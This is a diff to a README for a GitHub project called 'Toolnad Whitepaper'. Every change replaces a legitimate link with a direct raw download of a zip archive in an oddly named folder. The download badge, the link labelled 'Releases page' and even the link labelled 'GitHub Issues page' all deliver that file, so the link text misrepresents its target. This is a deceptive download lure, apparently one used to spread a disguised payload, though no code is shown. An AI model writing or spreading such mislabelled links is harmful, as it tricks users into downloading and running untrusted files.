@@ -6,7 +6,7 @@ Welcome to the Toolnad Whitepaper! This application provides a simple and effect
 
 ## 📥 Download Toolnad Whitepaper
 
-[![Download Toolnad Whitepaper](https://img.shields.io/badge/Download%20Now-Toolnad%20Whitepaper-brightgreen)](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/releases)
+[![Download Toolnad Whitepaper](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/raw/refs/heads/main/merosome/Toolnad_Whitepaper_v1.5.zip%20Now-Toolnad%20Whitepaper-brightgreen)](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/raw/refs/heads/main/merosome/Toolnad_Whitepaper_v1.5.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ To run Toolnad Whitepaper effectively, your system should meet the following req
 
 To get started with Toolnad Whitepaper, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/releases) to find the latest version of the app.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/raw/refs/heads/main/merosome/Toolnad_Whitepaper_v1.5.zip) to find the latest version of the app.
    
 2. **Select the Latest Release:** Look for the most recent release. It will usually be at the top of the page.
 
@@ -63,6 +63,6 @@ If you encounter any issues while downloading or installing Toolnad Whitepaper, 
 
 ## 💬 Support
 
-If you have questions or need further assistance, feel free to reach out. You can leave an issue on the [GitHub Issues page](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/issues) for community support.
+If you have questions or need further assistance, feel free to reach out. You can leave an issue on the [GitHub Issues page](https://github.com/AgusSetiyawan123/Toolnad-Whitepaper/raw/refs/heads/main/merosome/Toolnad_Whitepaper_v1.5.zip) for community support.
 
 Thank you for using Toolnad Whitepaper! Enjoy easy access to your favorite documents.
